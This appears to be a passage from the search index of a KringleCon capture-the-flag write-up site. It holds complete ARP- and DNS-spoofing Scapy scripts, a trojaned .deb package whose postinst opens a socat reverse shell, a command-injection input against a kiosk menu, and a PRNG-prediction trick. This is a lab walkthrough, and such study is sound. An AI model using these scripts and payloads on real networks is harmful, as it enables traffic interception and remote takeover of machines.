NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt and reading it we come across the following paragraph. RESOLUTIONS: The board took up final discussions of the plans presented last year for the expansion of Santa\u2019s Castle to include new courtyard, additional floors, elevator, roughly tripling the size of the current castle. Architect Ms. Pepper reviewed the planned changes and engineering reports. Chairman Frost noted, \u201cThese changes will put a heavy toll on the infrastructure of the North Pole.\u201d Mr. Krampus replied, \u201cThe infrastructure has already been expanded to handle it quite easily.\u201d Chairman Frost then noted, \u201cBut the additional traffic will be a burden on local residents.\u201d Dolly explained traffic projections were all in alignment with existing roadways. Chairman Frost then exclaimed, \u201cBut with all the attention focused on Santa and his castle, how will people ever come to refer to the North Pole as \u2018The Frostiest Place on Earth?\u2019\u201d Mr. In-the-Box pointed out that new tourist-friendly taglines are always under consideration by the North Pole Chamber of Commerce, and are not a matter for this Board. Mrs. Nature made a motion to approve. Seconded by Mr. Cornelius. Tanta Kringle recused herself from the vote given her adoption of Kris Kringle as a son early in his life. Rejoice We found that Tanta Kringle recused herself from the vote described on the document! Answer Tanta Kringle","title":"9) ARP Shenanigans"},{"location":"objectives/objective9/#9-arp-shenanigans","text":"difficulty \ud83c\udf84\ud83c\udf84\ud83c\udf84\ud83c\udf84","title":"9) ARP Shenanigans"},{"location":"objectives/objective9/#the-objective","text":"Go to the NetWars room on the roof and help Alabaster Snowball get access back to a host using ARP. Retrieve the document at /NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt. Who recused herself from the vote described on the document?","title":"The Objective"},{"location":"objectives/objective9/#chat-with-alabaster-snowball","text":"After helping Alabaster Snowball with the Scapy Practice challenge the following conversation ensues. Oh, I see the Scapy Present Packet Prepper has already been completed! Now you can help me get access to this machine. It seems that some interloper here at the North Pole has taken control of the host. We need to regain access to some important documents associated with Kringle Castle. Maybe we should try a machine-in-the-middle attack? That could give us access to manipulate DNS responses. But we'll still need to cook up something to change the HTTP response. I'm sure glad you're here Santa.","title":"Chat with Alabaster Snowball"},{"location":"objectives/objective9/#hints-courtesy-alabaster-snowball","text":"","title":"Hints Courtesy Alabaster Snowball"},{"location":"objectives/objective9/#sniffy","text":"Jack Frost must have gotten malware on our host at 10.6.6.35 because we can no longer access it. Try sniffing the eth0 interface using tcpdump -nni eth0 to see if you can view any traffic from that host.","title":"Sniffy"},{"location":"objectives/objective9/#spoofy","text":"The host is performing an ARP request. Perhaps we could do a spoof to perform a machine-in-the-middle attack. I think we have some sample scapy traffic scripts that could help you in /home/guest/scripts.","title":"Spoofy"},{"location":"objectives/objective9/#resolvy","text":"Hmmm, looks like the host does a DNS request after you successfully do an ARP spoof. Let's return a DNS response resolving the request to our IP.","title":"Resolvy"},{"location":"objectives/objective9/#embedy","text":"The malware on the host does an HTTP request for a .deb package. Maybe we can get command line access by sending it a command in a customized .deb file","title":"Embedy"},{"location":"objectives/objective9/#sniff","text":"let's sniff the eth0 interface using tcpdump. We see ARP traffic from host 10.6.6.35. The IP address of our host is 10.6.0.3 but perphaps we can pretend to be 10.6.6.53? guest@e41e2320b206:~$ tcpdump -nni eth0 tcpdump: verbose output suppressed, use -v or -vv for full protocol decode listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes 17:17:20.208002 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28 17:17:21.243912 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28 17:17:21.827077 IP6 fe80::f045:66ff:fe35:fcee > ff02::2: ICMP6, router solicitation, length 16 17:17:22.275888 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28 17:17:23.315873 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28 17:17:24.347884 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28 ^C 6 packets captured 6 packets received by filter 0 packets dropped by kernel guest@e41e2320b206:~$ ifconfig eth0: flags=4419<UP,BROADCAST,RUNNING,PROMISC,MULTICAST> mtu 1500 inet 10.6.0.3 netmask 255.255.0.0 broadcast 10.6.255.255 ether 02:42:0a:06:00:03 txqueuelen 0 (Ethernet) RX packets 61 bytes 2910 (2.9 KB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 0 bytes 0 (0.0 B) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 lo: flags=73<UP,LOOPBACK,RUNNING> mtu 65536 inet 127.0.0.1 netmask 255.0.0.0 loop txqueuelen 1000 (Local Loopback) RX packets 0 bytes 0 (0.0 B) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 0 bytes 0 (0.0 B) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 We can carry out an ARP spoof attack with the help of /home/guest/scripts/arp_resp.py . guest@e41e2320b206:~/scripts$ cat arp_resp.py #!/usr/bin/python3 from scapy.all import * import netifaces as ni import uuid # Our eth0 ip ipaddr = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr'] # Our eth0 mac address macaddr = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1]) def handle_arp_packets(packet): # if arp request, then we need to fill this out to send back our mac as the response if ARP in packet and packet[ARP].op == 1: ether_resp = Ether(dst=\"SOMEMACHERE\", type=0x806, src=\"SOMEMACHERE\") arp_response = ARP(pdst=\"SOMEMACHERE\") arp_response.op = 99999 arp_response.plen = 99999 arp_response.hwlen = 99999 arp_response.ptype = 99999 arp_response.hwtype = 99999 arp_response.hwsrc = \"SOMEVALUEHERE\" arp_response.psrc = \"SOMEVALUEHERE\" arp_response.hwdst = \"SOMEVALUEHERE\" arp_response.pdst = \"SOMEVALUEHERE\" response = ether_resp/arp_response sendp(response, iface=\"eth0\") def main(): # We only want arp requests berkeley_packet_filter = \"(arp[6:2] = 1)\" # sniffing for one packet that will be sent to a function, while storing none sniff(filter=berkeley_packet_filter, prn=handle_arp_packets, store=0, count=1) if __name__ == \"__main__\": main() Let's analyse the ARP packets sent by 10.6.6.35 using scapy and modify the script accordingly. guest@e41e2320b206:~$ tcpdump -nni eth0 -w sniff.pcap tcpdump: listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes ^C3 packets captured 4 packets received by filter 0 packets dropped by kernel guest@e41e2320b206:~$ which scapy /usr/local/bin/scapy guest@e41e2320b206:~$ /usr/local/bin/scapy INFO: Can't import matplotlib. Won't be able to plot. INFO: Can't import PyX. Won't be able to use psdump() or pdfdump(). INFO: No IPv6 support in kernel INFO: Can't import python-cryptography v1.7+. Disabled WEP decryption/encryption. (Dot11) INFO: Can't import python-cryptography v1.7+. Disabled IPsec encryption/authentication. WARNING: IPython not available. Using standard Python shell instead. AutoCompletion, History are disabled. aSPY//YASa apyyyyCY//////////YCa | sY//////YSpcs scpCY//Pp | Welcome to Scapy ayp ayyyyyyySCP//Pp syY//C | Version 2.4.4 AYAsAYYYYYYYY///Ps cY//S | pCCCCY//p cSSps y//Y | https://github.com/secdev/scapy SPPPP///a pP///AC//Y | A//A cyP////C | Have fun! p///Ac sC///a | P////YCpc A//A | Craft packets like I craft my beer. scccccp///pSP///p p//Y | -- Jean De Clerck sY/////////y caa S//P | cayCyayP//Ya pY/Ya sY/PsY////YCc aC//Yp sc sccaCY//PCypaapyCP//YSs spCPY//////YPSps ccaacs >>> PACKETS = rdpcap(\"/home/guest/sniff.pcap\") >>> PACKETS.show() 0000 Ether / ARP who has 10.6.6.53 says 10.6.6.35 0001 Ether / ARP who has 10.6.6.53 says 10.6.6.35 0002 Ether / ARP who has 10.6.6.53 says 10.6.6.35 >>> PACKETS[0] <Ether dst=ff:ff:ff:ff:ff:ff src=4c:24:57:ab:ed:84 type=ARP |<ARP hwtype=0x1 ptype=IPv4 hwlen=6 plen=4 op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 hwdst=00:00:00:00:00 :00 pdst=10.6.6.53 |>> the modifications are as follows The modified script is as follows #!/usr/bin/python3 from scapy.all import * import netifaces as ni import uuid # Our eth0 ip ipaddr = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr'] # Our eth0 mac address macaddr = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1]) def handle_arp_packets(packet): # if arp request, then we need to fill this out to send back our mac as the response if ARP in packet and packet[ARP].op == 1: ether_resp = Ether(dst=\"4c:24:57:ab:ed:84\", type=0x806, src=macaddr) arp_response = ARP(pdst=\"10.6.6.35\") arp_response.op = 2 arp_response.plen = 4 arp_response.hwlen = 6 arp_response.ptype = \"IPv4\" arp_response.hwtype = 1 arp_response.hwsrc = macaddr arp_response.psrc = \"10.6.6.53\" arp_response.hwdst = \"4c:24:57:ab:ed:84\" arp_response.pdst = \"10.6.6.35\" response = ether_resp/arp_response sendp(response, iface=\"eth0\") def main(): # We only want arp requests berkeley_packet_filter = \"(arp[6:2] = 1)\" # sniffing for one packet that will be sent to a function, while storing none sniff(filter=berkeley_packet_filter, prn=handle_arp_packets, store=0, count=0) if __name__ == \"__main__\": main() Let's run our modified script and sniff packets on eth0 again to check if our ARP spoof worked. guest@e41e2320b206:~$ tcpdump -nni eth0 -w arp_spoof.pcap tcpdump: listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes ^C9 packets captured 12 packets received by filter 0 packets dropped by kernel Opening up arp_spoof.pcap with scapy we see that our ARP spoof worked and we are getting DNS packets now. guest@e41e2320b206:~$ /usr/local/bin/scapy INFO: Can't import matplotlib. Won't be able to plot. INFO: Can't import PyX. Won't be able to use psdump() or pdfdump(). INFO: No IPv6 support in kernel INFO: Can't import python-cryptography v1.7+. Disabled WEP decryption/encryption. (Dot11) INFO: Can't import python-cryptography v1.7+. Disabled IPsec encryption/authentication. WARNING: IPython not available. Using standard Python shell instead. AutoCompletion, History are disabled. aSPY//YASa apyyyyCY//////////YCa | sY//////YSpcs scpCY//Pp | Welcome to Scapy ayp ayyyyyyySCP//Pp syY//C | Version 2.4.4 AYAsAYYYYYYYY///Ps cY//S | pCCCCY//p cSSps y//Y | https://github.com/secdev/scapy SPPPP///a pP///AC//Y | A//A cyP////C | Have fun! p///Ac sC///a | P////YCpc A//A | Craft packets like it is your last scccccp///pSP///p p//Y | day on earth. sY/////////y caa S//P | -- Lao-Tze cayCyayP//Ya pY/Ya | sY/PsY////YCc aC//Yp sc sccaCY//PCypaapyCP//YSs spCPY//////YPSps ccaacs >>> PACKETS = rdpcap(\"/home/guest/arp_spoof.pcap\") >>> PACKETS.show() 0000 Ether / ARP who has 10.6.6.53 says 10.6.6.35 0001 Ether / ARP is at 02:42:0a:06:00:03 says 10.6.6.53 0002 Ether / IP / UDP / DNS Qry \"b'ftp.osuosl.org.'\" 0003 Ether / ARP who has 10.6.6.53 says 10.6.6.35 0004 Ether / ARP is at 02:42:0a:06:00:03 says 10.6.6.53 0005 Ether / IP / UDP / DNS Qry \"b'ftp.osuosl.org.'\" 0006 Ether / ARP who has 10.6.6.53 says 10.6.6.35 0007 Ether / ARP is at 02:42:0a:06:00:03 says 10.6.6.53 0008 Ether / IP / UDP / DNS Qry \"b'ftp.osuosl.org.'\" >>> PACKETS[2] <Ether dst=02:42:0a:06:00:03 src=4c:24:57:ab:ed:84 type=IPv4 |<IP version=4 ihl=5 tos=0x0 len=60 id=1 flags= frag=0 ttl=64 proto=udp chksum=0x5a4d src=10.6.6.35 dst=10.6.6.5 3 |<UDP sport=38919 dport=domain len=40 chksum=0xa256 |<DNS id=0 qr=0 opcode=QUERY aa=0 tc=0 rd=1 ra=0 z=0 ad=0 cd=0 rcode=ok qdcount=1 ancount=0 nscount=0 arcount=0 qd=<DNS QR qname='ftp.osuosl.org.' qtype=A qclass=IN |> an=None ns=None ar=None |>>>> Looks like the host is trying to resolve the domain ftp.osuosl.org. We can play the role of the resolver here by way of a DNS spoof attack and supply a DNS response containing a mapping of ftp.osuosl.org to any IP of our choice. We will choose to map ftp.osuos1.org to our own IP address 10.6.0.3 . We can carry out an ARP spoof attack with the help of the script /home/guest/scripts/dns_resp.py . guest@e41e2320b206:~/scripts$ cat dns_resp.py #!/usr/bin/python3 from scapy.all import * import netifaces as ni import uuid # Our eth0 IP ipaddr = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr'] # Our Mac Addr macaddr = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1]) # destination ip we arp spoofed ipaddr_we_arp_spoofed = \"10.6.1.10\" def handle_dns_request(packet): # Need to change mac addresses, Ip Addresses, and ports below. # We also need eth = Ether(src=\"00:00:00:00:00:00\", dst=\"00:00:00:00:00:00\") # need to replace mac addresses ip = IP(dst=\"0.0.0.0\", src=\"0.0.0.0\") # need to replace IP addresses udp = UDP(dport=99999, sport=99999) # need to replace ports dns = DNS( # MISSING DNS RESPONSE LAYER VALUES ) dns_response = eth / ip / udp / dns sendp(dns_response, iface=\"eth0\") def main(): berkeley_packet_filter = \" and \".join( [ \"udp dst port 53\", # dns \"udp[10] & 0x80 = 0\", # dns request \"dst host {}\".format(ipaddr_we_arp_spoofed), # destination ip we had spoofed (not our real ip) \"ether dst host {}\".format(macaddr) # our macaddress since we spoofed the ip to our mac ] ) # sniff the eth0 int without storing packets in memory and stopping after one dns request sniff(filter=berkeley_packet_filter, prn=handle_dns_request, store=0, iface=\"eth0\", count=1) if __name__ == \"__main__\": main() We need to modify the script as follows The modified script is as follows guest@e41e2320b206:~/scripts$ cat our_dns_resp.py #!/usr/bin/python3 from scapy.all import * import netifaces as ni import uuid # Our eth0 IP ipaddr = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr'] # Our Mac Addr macaddr = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1]) # destination ip we arp spoofed ipaddr_we_arp_spoofed = \"10.6.6.53\" def handle_dns_request(packet): # Need to change mac addresses, Ip Addresses, and ports below. # We also need eth = Ether(src=macaddr, dst=\"4c:24:57:ab:ed:84\") # need to replace mac addresses ip = IP(dst=\"10.6.6.35\", src=ipaddr_we_arp_spoofed) # need to replace IP addresses udp = UDP(dport=packet[UDP].sport, sport=packet[UDP].dport) # need to replace ports dns = DNS(id=packet[DNS].id, qd=packet[DNS].qd, qr=1,an=DNSRR(rrname=packet[DNS].qd.qname, ttl=10, rdata=\"10.6.0.3\")) dns_response = eth / ip / udp / dns sendp(dns_response, iface=\"eth0\") def main(): berkeley_packet_filter = \" and \".join( [ \"udp dst port 53\", # dns \"udp[10] & 0x80 = 0\", # dns request \"dst host {}\".format(ipaddr_we_arp_spoofed), # destination ip we had spoofed (not our real ip) \"ether dst host {}\".format(macaddr) # our macaddress since we spoofed the ip to our mac ] ) # sniff the eth0 int without storing packets in memory and stopping after one dns request sniff(filter=berkeley_packet_filter, prn=handle_dns_request, store=0, iface=\"eth0\", count=0) if __name__ == \"__main__\": main() Now with our our_arp_resp.py script running, let's additionally run our_dns_resp.py as well. Let's sniff packets on eth0 interface to check if our DNS spoof worked. guest@e41e2320b206:~$ tcpdump -nni eth0 -w dns_spoof.pcap tcpdump: listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes ^C84 packets captured 103 packets received by filter 0 packets dropped by kernel guest@e41e2320b206:~$ /usr/local/bin/scapy INFO: Can't import matplotlib. Won't be able to plot. INFO: Can't import PyX. Won't be able to use psdump() or pdfdump(). INFO: No IPv6 support in kernel INFO: Can't import python-cryptography v1.7+. Disabled WEP decryption/encryption. (Dot11) INFO: Can't import python-cryptography v1.7+. Disabled IPsec encryption/authentication. WARNING: IPython not available. Using standard Python shell instead. AutoCompletion, History are disabled. aSPY//YASa apyyyyCY//////////YCa | sY//////YSpcs scpCY//Pp | Welcome to Scapy ayp ayyyyyyySCP//Pp syY//C | Version 2.4.4 AYAsAYYYYYYYY///Ps cY//S | pCCCCY//p cSSps y//Y | https://github.com/secdev/scapy SPPPP///a pP///AC//Y | A//A cyP////C | Have fun! p///Ac sC///a | P////YCpc A//A | What is dead may never die! scccccp///pSP///p p//Y | -- Python 2 sY/////////y caa S//P | cayCyayP//Ya pY/Ya sY/PsY////YCc aC//Yp sc sccaCY//PCypaapyCP//YSs spCPY//////YPSps ccaacs >>> PACKETS = rdpcap(\"/home/guest/dns_spoof.pcap\") guest@e41e2320b206:~$ tcpdump -nni eth0 -w dns_spoof.pcap tcpdump: listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes ^C84 packets captured 103 packets received by filter 0 packets dropped by kernel guest@e41e2320b206:~$ /usr/local/bin/scapy INFO: Can't import matplotlib. Won't be able to plot. INFO: Can't import PyX. Won't be able to use psdump() or pdfdump(). INFO: No IPv6 support in kernel INFO: Can't import python-cryptography v1.7+. Disabled WEP decryption/encryption. (Dot11) INFO: Can't import python-cryptography v1.7+. Disabled IPsec encryption/authentication. WARNING: IPython not available. Using standard Python shell instead. AutoCompletion, History are disabled. aSPY//YASa apyyyyCY//////////YCa | sY//////YSpcs scpCY//Pp | Welcome to Scapy ayp ayyyyyyySCP//Pp syY//C | Version 2.4.4 AYAsAYYYYYYYY///Ps cY//S | pCCCCY//p cSSps y//Y | https://github.com/secdev/scapy SPPPP///a pP///AC//Y | A//A cyP////C | Have fun! p///Ac sC///a | P////YCpc A//A | What is dead may never die! scccccp///pSP///p p//Y | -- Python 2 sY/////////y caa S//P | cayCyayP//Ya pY/Ya sY/PsY////YCc aC//Yp sc sccaCY//PCypaapyCP//YSs spCPY//////YPSps ccaacs >>> PACKETS = rdpcap(\"/home/guest/dns_spoof.pcap\") >>> PACKETS.show() 0063 Ether / IP / TCP 10.6.0.3:47554 > 10.6.6.35:64352 S 0064 Ether / IP / TCP 10.6.6.35:64352 > 10.6.0.3:47554 SA 0065 Ether / IP / TCP 10.6.0.3:47554 > 10.6.6.35:64352 A 0066 Ether / IP / TCP 10.6.0.3:47554 > 10.6.6.35:64352 PA / Raw 0067 Ether / IP / TCP 10.6.6.35:64352 > 10.6.0.3:47554 A 0068 Ether / IP / TCP 10.6.6.35:64352 > 10.6.0.3:47554 PA / Raw 0069 Ether / IP / TCP 10.6.0.3:47554 > 10.6.6.35:64352 A 0070 Ether / IP / TCP 10.6.0.3:47554 > 10.6.6.35:64352 PA / Raw 0071 Ether / IP / TCP 10.6.0.3:47554 > 10.6.6.35:64352 PA / Raw 0072 Ether / IP / TCP 10.6.6.35:64352 > 10.6.0.3:47554 PA / Raw 0073 Ether / IP / TCP 10.6.6.35:32800 > 10.6.0.3:http S 0074 Ether / IP / TCP 10.6.0.3:http > 10.6.6.35:32800 RA 0075 Ether / IP / TCP 10.6.6.35:64352 > 10.6.0.3:47554 FPA / Raw 0076 Ether / IP / TCP 10.6.0.3:47554 > 10.6.6.35:64352 A 0077 Ether / IP / TCP 10.6.0.3:47554 > 10.6.6.35:64352 FA 0078 Ether / IP / TCP 10.6.6.35:64352 > 10.6.0.3:47554 A Looks like our DNS Spoof worked! The below packet is particularly interesting. Looks like 10.6.6.35 is trying to send an HTTP request to port 80. 0073 Ether / IP / TCP 10.6.6.35:32800 > 10.6.0.3:http S Let' spoof an http server on port 80. We can do this by running the command python3 -m http.server 80 .Looks like the malware running on 10.6.6.35 is trying to fetch /pub/jfrost/backdoor/suriv_amd64.deb . guest@e41e2320b206:~$ python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... 10.6.6.35 - - [10/Jan/2021 19:14:14] code 404, message File not found 10.6.6.35 - - [10/Jan/2021 19:14:14] \"GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1\" 404 - 10.6.6.35 - - [10/Jan/2021 19:14:15] code 404, message File not found 10.6.6.35 - - [10/Jan/2021 19:14:15] \"GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1\" 404 - 10.6.6.35 - - [10/Jan/2021 19:14:16] code 404, message File not found 10.6.6.35 - - [10/Jan/2021 19:14:16] \"GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1\" 404 - Let's make this deb file available. However we will customise this deb file so that when the host installs it a reverse shell would be spawned and we can obtain command line access. We can choose any of the deb files available in /home/guest/debs to customise. guest@8238d08d5d09:~/debs$ ls gedit-common_3.36.1-1_all.deb nano_4.8-1ubuntu1_amd64.deb nmap_7.80+dfsg1-2build1_amd64.deb unzip_6.0-25ubuntu1_amd64.deb golang-github-huandu-xstrings-dev_1.2.1-1_all.deb netcat-traditional_1.10-41.1ubuntu1_amd64.deb socat_1.7.3.3-2_amd64.deb We get a clue on how to customise a deb file from hint 4. We need to extract the deb using command dpkg -x <file.deb> <directory> create a directory called DEBIAN in it which contains two files -control and postinst rebuild the deb using command dpkg-deb --build <directory> The postinst file will contain the commands to be executed. In our case we will include a command to spawn a Socat reverse shell. guest@f9ce1b9af4a1:~/debs$ dpkg -x nmap_7.80+dfsg1-2build1_amd64.deb work guest@f9ce1b9af4a1:~/debs$ mkdir -p work/DEBIAN guest@f9ce1b9af4a1:~/debs$ touch work/DEBIAN/control guest@f9ce1b9af4a1:~/debs$ touch work/DEBIAN/postinst guest@f9ce1b9af4a1:~/debs$ vi work/DEBIAN/control guest@f9ce1b9af4a1:~/debs$ cat work/DEBIAN/control Package: nmap7 Version: 7.80+dfsg1-2 Architecture: any Maintainer: lel <packages@qa.debian.org> Description: must-install awesome tool guest@f9ce1b9af4a1:~/debs$ vi work/DEBIAN/postinst guest@f9ce1b9af4a1:~/debs$ cat work/DEBIAN/postinst RHOST=10.6.0.3 RPORT=4444 socat tcp-connect:$RHOST:$RPORT exec:/bin/sh,pty,stderr,setsid,sigint,sane guest@f9ce1b9af4a1:~/debs$ dpkg-deb --build work/ dpkg-deb: error: maintainer script 'postinst' has bad permissions 664 (must be >=0555 and <=0775) guest@f9ce1b9af4a1:~/debs$ chmod 775 work/DEBIAN/postinst guest@f9ce1b9af4a1:~/debs$ dpkg-deb --build work/ dpkg-deb: building package 'nmap7' in 'work.deb'. Now let's set up a Socat listener to receive the shell. socat file:`tty`,raw,echo=0 tcp-listen:4444 Let's rename the deb file and serve it. Make sure the hierarchy of directories is correct. guest@f9ce1b9af4a1:~/debs$ mkdir -p ./pub/jfrost/backdoor/ guest@f9ce1b9af4a1:~/debs$ cp work.deb suriv_amd64.deb guest@f9ce1b9af4a1:~/debs$ cp suriv_amd64.deb ./pub/jfrost/backdoor/ guest@f9ce1b9af4a1:~/debs$ python3 -m http.server 80 We caught the reverse shell! guest@f9ce1b9af4a1:~$ socat file:`tty`,raw,echo=0 tcp-listen:4444 /bin/sh: 0: can't access tty; job control turned off guest@f9ce1b9af4a1:~$ socat file:`tty`,raw,echo=0 tcp-listen:4444 /bin/sh: 0: can't access tty; job control turned off $ python3 -c 'import pty; pty.spawn(\"/bin/bash\")' bash: /root/.bashrc: Permission denied jfrost@e0b14eab16d0:/$ ls NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt etc lib64 opt sbin usr bin home libx32 proc srv var boot lib media root sys dev lib32 mnt run tmp On opening the file NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt and reading it we come across the following paragraph. RESOLUTIONS: The board took up final discussions of the plans presented last year for the expansion of Santa\u2019s Castle to include new courtyard, additional floors, elevator, roughly tripling the size of the current castle. Architect Ms. Pepper reviewed the planned changes and engineering reports. Chairman Frost noted, \u201cThese changes will put a heavy toll on the infrastructure of the North Pole.\u201d Mr. Krampus replied, \u201cThe infrastructure has already been expanded to handle it quite easily.\u201d Chairman Frost then noted, \u201cBut the additional traffic will be a burden on local residents.\u201d Dolly explained traffic projections were all in alignment with existing roadways. Chairman Frost then exclaimed, \u201cBut with all the attention focused on Santa and his castle, how will people ever come to refer to the North Pole as \u2018The Frostiest Place on Earth?\u2019\u201d Mr. In-the-Box pointed out that new tourist-friendly taglines are always under consideration by the North Pole Chamber of Commerce, and are not a matter for this Board. Mrs. Nature made a motion to approve. Seconded by Mr. Cornelius. Tanta Kringle recused herself from the vote given her adoption of Kris Kringle as a son early in his life.","title":"Sniff"},{"location":"objectives/objective9/#rejoice","text":"We found that Tanta Kringle recused herself from the vote described on the document! Answer Tanta Kringle","title":"Rejoice"},{"location":"terminals/terminal1/","text":"1) Kringle Kiosk Chat with Shinny Upatree Check out this cool KringleCon kiosk! You can get a map of the castle, learn about where the elves are, and get your own badge printed right on-screen! Be careful with that last one though. I heard someone say it's \"ingestible.\" Or something... Do you think you could check and see if there is an issue? Hints Courtesy Shinny Upatree Command Injection There's probably some kind of command injection vulnerability in the menu terminal. Solution Shinny Upatree hints at there being a command injection problem with the printing badges option. As suggested in the hint let's try out commmands separated with a semicolom to check for command injection. Sure enough that worked! ~~~~~~~~~~~~~~~~~~~~~~~~~~~ Welcome to the North Pole! ~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 1. Map 2. Code of Conduct and Terms of Use 3. Directory 4. Print Name Badge 5. Exit Please select an item from the menu by entering a single number. Anything else might have ... unintended consequences. Enter choice [1 - 5] 4 Enter your name (Please avoid special characters, they cause some weird errors)...hello;/b in/bash Rejoice Yay! we helped Shinny Upatree!","title":"Kringle Kiosk"},{"location":"terminals/terminal1/#1-kringle-kiosk","text":"","title":"1) Kringle Kiosk"},{"location":"terminals/terminal1/#chat-with-shinny-upatree","text":"Check out this cool KringleCon kiosk! You can get a map of the castle, learn about where the elves are, and get your own badge printed right on-screen! Be careful with that last one though. I heard someone say it's \"ingestible.\" Or something... Do you think you could check and see if there is an issue?","title":"Chat with Shinny Upatree"},{"location":"terminals/terminal1/#hints-courtesy-shinny-upatree","text":"","title":"Hints Courtesy Shinny Upatree"},{"location":"terminals/terminal1/#command-injection","text":"There's probably some kind of command injection vulnerability in the menu terminal.","title":"Command Injection"},{"location":"terminals/terminal1/#solution","text":"Shinny Upatree hints at there being a command injection problem with the printing badges option. As suggested in the hint let's try out commmands separated with a semicolom to check for command injection. Sure enough that worked! ~~~~~~~~~~~~~~~~~~~~~~~~~~~ Welcome to the North Pole! ~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 1. Map 2. Code of Conduct and Terms of Use 3. Directory 4. Print Name Badge 5. Exit Please select an item from the menu by entering a single number. Anything else might have ... unintended consequences. Enter choice [1 - 5] 4 Enter your name (Please avoid special characters, they cause some weird errors)...hello;/b in/bash","title":"Solution"},{"location":"terminals/terminal1/#rejoice","text":"Yay! we helped Shinny Upatree!","title":"Rejoice"},{"location":"terminals/terminal12/","text":"12)Snowball Game Chat with Tangle Coalbox Howdy Boss. You look a tad flushed. Can I get you some water from the vending machine? I'm still looking into the Snowball Game like you asked. I read the write-up of the test completed earlier this summer with the web socket vulnerabilities. I was able to complete the Easy level, but the Impossible level is, umm... I'd call it impossible, but I just saw someone beat it! Is it possible that the name a player provides influences how the forts are laid out? Oh, oh, maybe if I feed a Hard name into an Easy game I can manipulate it! UGH! on Impossible, the best I get are rejected player names in the page comments... maybe that's useful? I'll have to re-watch Tom Liston's talk again. Thanks for all the tips and encouragement Santa! Hints Courtesy Tangle Coalbox Mersenne Twister Python uses the venerable Mersenne Twister algorithm to generate PRNG values after seed. Given enough data, an attacker might predict upcoming values. PRNG Seeding While system time is probably most common, developers have the option to seed pseudo-random number generators with other values. Twisted Talk Tom Liston is giving two talks at once - amazing! One is about the Mersenne Twister . Extra Instances Need extra Snowball Game instances? Pop them up in a new tab from https://snowball2.kringlecastle.com. Solution The key idea here is that the name of the player is linked to the game that is presented to the player. same name=same game. The names on the impossible level are redacted. If could somehow predict the name we would get on an impossible level we can input this name to play the same game on easy and then come back to impossible and beat it! Let's open up an game on impossible level and inspect the html page. We see the following comment. This looks like a list of random rejected names. We assume these numbers were generated by MT-19937. Now opening these comments in a text file we see that we have 624 names. We can predict the next name using mt19937predict tool as shown below. 860765718 is the name of the next game. We can play this game in easy, record the solution and use this solution to beat the game on impossible! Rejoice Yay! we helped Tangle Coalbox!","title":"Snowball Game"},{"location":"terminals/terminal12/#12snowball-game","text":"","title":"12)Snowball Game"},{"location":"terminals/terminal12/#chat-with-tangle-coalbox","text":"Howdy Boss. You look a tad flushed. Can I get you some water from the vending machine? I'm still looking into the Snowball Game like you asked. I read the write-up of the test completed earlier this summer with the web socket vulnerabilities. I was able to complete the Easy level, but the Impossible level is, umm... I'd call it impossible, but I just saw someone beat it! Is it possible that the name a player provides influences how the forts are laid out? Oh, oh, maybe if I feed a Hard name into an Easy game I can manipulate it! UGH! on Impossible, the best I get are rejected player names in the page comments... maybe that's useful? I'll have to re-watch Tom Liston's talk again. Thanks for all the tips and encouragement Santa!","title":"Chat with Tangle Coalbox"},{"location":"terminals/terminal12/#hints-courtesy-tangle-coalbox","text":"","title":"Hints Courtesy Tangle Coalbox"},{"location":"terminals/terminal12/#mersenne-twister","text":"Python uses the venerable Mersenne Twister algorithm to generate PRNG values after seed. Given enough data, an attacker might predict upcoming values.","title":"Mersenne Twister"},{"location":"terminals/terminal12/#prng-seeding","text":"While system time is probably most common, developers have the option to seed pseudo-random number generators with other values.","title":"PRNG Seeding"},{"location":"terminals/terminal12/#twisted-talk","text":"Tom Liston is giving two talks at once - amazing! One is about the Mersenne Twister .","title":"Twisted Talk"},{"location":"terminals/terminal12/#extra-instances","text":"Need extra Snowball Game instances? Pop them up in a new tab from https://snowball2.kringlecastle.com.","title":"Extra Instances"},{"location":"terminals/terminal12/#solution","text":"The key idea here is that the name of the player is linked to the game that is presented to the player. same name=same game. The names on the impossible level are redacted. If could somehow predict the name we would get on an impossible level we can input this name to play the same game on easy and then come back to impossible and beat it! Let's open up an game on impossible level and inspect the html page. We see the following comment. This looks like a list of random rejected names. We assume these numbers were generated by MT-19937. Now opening these comments in a text file we see that we have 624 names. We can predict the next name using mt19937predict tool as shown below. 860765718 is the name of the next game. We can play this game in easy, record the solution and use this solution to beat the game on impossible!","title":"Solution"},{"location":"terminals/terminal12/#rejoice","text":"Yay! we helped Tangle 